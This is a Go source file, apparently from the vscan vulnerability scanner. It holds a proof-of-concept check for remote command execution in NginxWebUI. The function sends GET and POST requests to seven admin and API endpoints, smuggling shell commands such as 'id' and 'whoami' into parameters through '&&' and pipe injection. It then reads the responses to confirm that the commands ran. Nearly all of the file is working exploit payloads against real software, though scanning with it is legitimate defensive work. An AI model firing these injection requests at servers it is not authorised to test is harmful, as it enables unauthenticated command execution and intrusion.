package nginx

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func NginxWebUI_runCmd_rce(u string) bool {

	if resp, err := pkg.HttpRequset(u+"/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx", "GET", "", false, nil); err == nil {
		if strings.Contains(resp.Body, "uid") && strings.Contains(resp.Body, "gid") && strings.Contains(resp.Body, "groups") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln NginxWebUI_runCmd_rce|%s|参考链接：https://mp.weixin.qq.com/s/22Xh71sdkeWncDEJNqPqJA\n", u))
			return true
		}
	}
	if resp, err := pkg.HttpRequset(u+"/AdminPage/conf/runCmd?cmd=hoami%26%26nginx", "GET", "", false, nil); err == nil {
		if strings.Contains(resp.Body, "success") && strings.Contains(resp.Body, "status") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln NginxWebUI_runCmd_rce|%s|参考链接：https://mp.weixin.qq.com/s/22Xh71sdkeWncDEJNqPqJA\n", u))
			return true
		}
	}
	header := make(map[string]string)
	header["X-Requested-With"] = "XMLHttpRequest"
	header["Content-Type"] = "application/x-www-form-urlencoded"
	payload := "remoteId=local&cmd=start whoami%26%26nginx&interval=1"
	if resp, err := pkg.HttpRequset(u+"/AdminPage/remote/cmdOver", "POST", payload, false, header); err == nil {
		if strings.Contains(resp.Body, "success") && strings.Contains(resp.Body, "status") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln NginxWebUI_runCmd_rce|%s|参考链接：https://mp.weixin.qq.com/s/22Xh71sdkeWncDEJNqPqJA\n", u))
			return true
		}
	}
	payload1 := "cmd=whoami%26%26nginx"
	if resp, err := pkg.HttpRequset(u+"/Api/nginx/runNginxCmd", "POST", payload1, false, header); err == nil {
		if strings.Contains(resp.Body, "success") && strings.Contains(resp.Body, "status") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln NginxWebUI_runCmd_rce|%s|参考链接：https://mp.weixin.qq.com/s/22Xh71sdkeWncDEJNqPqJA\n", u))
			return true
		}
	}
	if resp, err := pkg.HttpRequset(u+"/AdminPage/conf/reload?nginxExe=whoami%20%7C", "GET", "", false, nil); err == nil {
		if strings.Contains(resp.Body, "success") && strings.Contains(resp.Body, "status") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln NginxWebUI_runCmd_rce|%s|参考链接：https://mp.weixin.qq.com/s/22Xh71sdkeWncDEJNqPqJA\n", u))
			return true
		}
	}
	payload2 := "nginxExe=whoami%20%7C&json={\"nginxContent\":\"\",\"subContent\":\"[]\",\"subName\":\"[]\"}&nginxPath=/1/"
	if resp, err := pkg.HttpRequset(u+"/AdminPage/conf/check", "POST", payload2, false, header); err == nil {
		if strings.Contains(resp.Body, "success") && strings.Contains(resp.Body, "status") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln NginxWebUI_runCmd_rce|%s|参考链接：https://mp.weixin.qq.com/s/22Xh71sdkeWncDEJNqPqJA\n", u))
			return true
		}
	}
	payload3 := "nginxExe=whoami%20%7C&nginxPath=/&nginxDir=/"
	if resp, err := pkg.HttpRequset(u+"/AdminPage/conf/saveCmd", "POST", payload3, false, header); err == nil {
		if strings.Contains(resp.Body, "success") && strings.Contains(resp.Body, "status") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln NginxWebUI_runCmd_rce|%s|参考链接：https://mp.weixin.qq.com/s/22Xh71sdkeWncDEJNqPqJA\n", u))
			return true
		}
	}
	return false
}
